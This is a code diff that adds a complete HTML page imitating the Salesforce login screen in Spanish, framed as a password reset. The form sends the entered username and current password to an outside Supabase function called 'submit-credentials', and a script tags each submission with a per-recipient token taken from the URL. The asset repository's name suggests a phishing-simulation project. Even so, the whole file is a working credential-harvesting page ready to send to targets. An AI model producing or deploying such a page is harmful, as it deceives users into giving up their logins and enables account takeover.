@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>Salesforce - Iniciar sesión</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f3f2f2;font-family:'Salesforce Sans','Segoe UI',Arial,sans-serif;color:#16325c;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:420px;padding:40px 32px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
+  .logo{height:30px;margin-bottom:28px}
+  h1{font-weight:300;font-size:22px;margin:0 0 24px;color:#16325c}
+  input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #d8dde6;border-radius:4px;outline:none;font-family:inherit;margin-bottom:14px}
+  input:focus{border-color:#1589ee;box-shadow:0 0 3px #00a1e0}
+  button{display:block;width:100%;background:#0070d2;color:#fff;border:none;padding:13px;font-size:15px;font-weight:400;border-radius:4px;cursor:pointer;font-family:inherit;margin-top:12px}
+  button:hover{background:#005fb2}
+  .hint{font-size:13px;color:#54698d;margin-top:18px;text-align:center}
+  a{color:#0070d2;text-decoration:none}
+  a:hover{text-decoration:underline}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/salesforce.png" alt="Salesforce">
+  <h1>Restablecer contraseña</h1>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <input type="text" name="username" placeholder="Nombre de usuario" required autofocus>
+    <input type="password" name="password" placeholder="Contraseña actual" required>
+    <button type="submit">Iniciar sesión</button>
+  </form>
+  <p class="hint"><a href="#">¿Olvidaste tu contraseña?</a> · <a href="#">Usar dominio personalizado</a></p>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
